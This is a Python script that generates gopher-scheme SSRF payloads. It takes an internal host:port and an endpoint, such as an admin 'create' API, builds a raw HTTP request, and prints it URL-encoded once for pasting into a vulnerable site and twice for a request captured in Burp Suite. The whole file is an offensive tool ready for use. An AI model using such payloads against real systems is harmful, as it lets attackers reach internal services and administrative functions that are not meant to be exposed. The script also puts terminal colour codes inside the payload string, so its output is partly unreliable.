#!/usr/bin/python3
from colorama import Fore, Back, Style, init
init(autoreset=True)  # Auto reset color for each print

def custom_url_encode(data, times=1):
    # Encode specified characters
    def encode_special_chars(s):
        replacements = {' ': '%20', '\n': '%0A', '&': '%26'}
        for original, encoded in replacements.items():
            s = s.replace(original, encoded)
        return s

    # Double encoding requires encoding '%' as '%25' on the second pass
    def double_encode_special_chars(s):
        s = s.replace('%', '%25')  # First, replace '%' from the first encoding to '%25'
        return encode_special_chars(s)  # Then apply the original encoding replacements

    encoded_data = data
    for i in range(times):
        if i == 0:  # First round of encoding
            encoded_data = encode_special_chars(encoded_data)
        else:  # Second round of encoding
            encoded_data = double_encode_special_chars(encoded_data)
    return encoded_data

def main():
    # User inputs
    print("")
    internal_domain_ip = input(f"{Style.BRIGHT}Provide `{Fore.GREEN}internal-domain/ip:port{Style.RESET_ALL}{Style.BRIGHT}`, do not specify protocol (Ex: {Fore.GREEN}localhost:80{Style.RESET_ALL} ):\n")
    print("")

    endpoint = input(f"{Style.BRIGHT}Provide `{Fore.GREEN}endpoint/file{Style.RESET_ALL}{Style.BRIGHT}` that request will be sent to (Ex: /{Fore.GREEN}api/admin/create{Style.RESET_ALL} ):\n")
    print("")

    # Extract domain/IP without port for the Host header
    internal_domain_ip_only = internal_domain_ip.split(':')[0]

    # Since the data is in the URL, the body is empty, hence Content-Length is 0
    content_length = 0
    
    # Construct the payload gopher
    payload_gopher = f"{Style.BRIGHT}{Fore.GREEN}gopher://{internal_domain_ip}/_GET {endpoint} HTTP/1.1\nHost: {internal_domain_ip_only}\n\n"
    print("")
    print("")
    print(f"{Style.BRIGHT}{Fore.BLUE}OPTION-1: gopher-get: Access to a specific {Fore.BLUE}endpoint/file{Style.RESET_ALL}")
    print(f"{Style.BRIGHT}[+] Original Payload Gopher:")
    print(f"{Style.BRIGHT}=====")
    print(payload_gopher)
    print(f"{Style.BRIGHT}=====")
    
    # URL encoding one time
    url_encoded_1_time = custom_url_encode(payload_gopher, 1)
    print("")
    print("")
    print(f"{Style.BRIGHT}[+] Payload get URL-encoded-1-time: Paste directly on target-site, where SSRF happens")
    print(f"{Style.BRIGHT}=====")
    print(url_encoded_1_time)
    print(f"{Style.BRIGHT}=====")
    
    # URL encoding two times
    url_encoded_2_times = custom_url_encode(payload_gopher, 2)  # Properly encode the string a second time
    print("")
    print("")
    print(f"{Style.BRIGHT}[+] Payload get URL-encoded-2-times: Paste directly on captured-request via Burpsuite")
    print(f"{Style.BRIGHT}=====")
    print(url_encoded_2_times)
    print(f"{Style.BRIGHT}=====")

if __name__ == "__main__":
    main()
